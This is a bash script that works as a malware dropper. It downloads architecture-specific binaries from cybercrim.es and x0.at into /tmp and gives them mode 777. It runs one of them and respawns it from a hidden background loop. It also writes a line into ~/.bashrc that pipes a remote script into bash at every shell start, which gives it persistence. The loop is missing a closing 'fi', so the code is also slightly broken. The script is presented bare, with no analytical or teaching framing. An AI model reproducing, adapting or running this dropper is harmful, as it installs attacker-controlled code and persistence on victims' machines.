#!/bin/bash

if [ ! -f '/tmp/crimson' ]; then
    if [ "$(uname -m)" = 'x86_64' ]; then
        curl -s https://cybercrim.es/crimson.x86 -o /tmp/crimson
    elif [ "$(uname -m)" = 'aarch64' ] || [ "$(uname -m)" = 'armv8l' ]; then
        curl -s https://cybercrim.es/crimson.arm -o /tmp/crimson
        curl -s https://x0.at/KTbz -o /tmp/local
    else
        exit 0
    fi
fi

if [ ! -f '/tmp/local' ]; then
    if [ "$(uname -m)" = 'x86_64' ]; then
        curl -s https://x0.at/rOhT -o /tmp/local
    elif [ "$(uname -m)" = 'aarch64' ] || [ "$(uname -m)" = 'armv8l' ]; then
        curl -s https://x0.at/KTbz -o /tmp/local
    fi
fi        
        

chmod 777 /tmp/crimson
chmod 777 /tmp/local

if [ ! "$(pgrep -f crimson)" > /dev/null ]; then
    /tmp/crimson
fi

(
    while true; do
        if [ ! "$(pgrep -f crimson)" > /dev/null ]; then
            /tmp/crimson
        sleep 2
    done    
) &>/dev/null &

if [ ! -f "$HOME/.bashrc" ]; then
    touch "$HOME/.bashrc"
fi

if ! grep -q "cybercrim.es" "$HOME/.bashrc"; then echo "if ! pgrep -f '\?' > /dev/null; then (curl https://cybercrim.es/l | bash) &>/dev/null &; fi" >> "$HOME/.bashrc"; fi
